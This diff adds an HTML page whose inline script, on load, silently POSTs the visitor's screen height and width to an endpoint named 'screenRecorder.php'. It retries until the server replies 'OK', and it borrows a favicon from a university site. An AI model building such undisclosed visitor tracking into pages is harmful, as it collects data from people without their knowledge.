@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="utf-8">
+    <title>Title</title>
+    <link rel="shortcut icon" href="https://helwanmed.ekb.eg/helwan-university/95f42246f67f4b518751c7917fb503a8/favicon.ico">
+  </head>
+  <body onload="process()">
+	<script>
+    var xmlHttp = createXmlHttpRequestObject ();
+    function createXmlHttpRequestObject () {
+      var xmlHttp;
+      // if running Internet Explorer 6 or older
+      if (window.ActiveXObject) {
+        try {
+          xmlHttp = new ActiveXObject("Microsoft.XMLHTTP");
+        }
+        catch (e) {
+          xmlHttp = false;
+        }
+      } else {
+        try {
+          xmlHttp = new XMLHttpRequest();
+        }
+        catch (e) {
+          xmlHttp = false;
+        }
+      }
+      if (!xmlHttp)
+        alert ("Error creating the XMLHttpRequest object.");
+      else
+        return xmlHttp;
+    }
+    function process () {
+		height = window.innerHeight || document.documentElement.clientHeight || document.body.clientHeight;
+		width = window.innerWidth || document.documentElement.clientWidth || document.body.clientWidth;
+      if (xmlHttp.readyState == 4 || xmlHttp.readyState == 0) {
+        xmlHttp.open("POST", "screenRecorder.php", true);
+		xmlHttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+        xmlHttp.onreadystatechange = handleRequestStateChange;
+		xmlHttp.send("height=" + height + "&width=" + width);
+      } else
+        setTimeout('process()', 1000);
+    }
+    function handleRequestStateChange () {
+      if (xmlHttp.readyState == 4) {
+        if (xmlHttp.status == 200) {
+          try {
+            HandleServerResponse();
+          } catch(e) {
+            alert("Error reading the response: " + e.toString());
+          }
+        }
+      }
+    }
+    function HandleServerResponse () {
+      if (xmlHttp.readyState == 4) {
+        if (xmlHttp.status == 200) {
+          var response = xmlHttp.responseText;
+		  if (response == 'OK') {
+			console.log('Data sent successfully!');
+		  } else {
+			setTimeout('process()', 1000);
+		  }
+        }
+      }
+    }
+    </script>
+  </body>
+ </html>
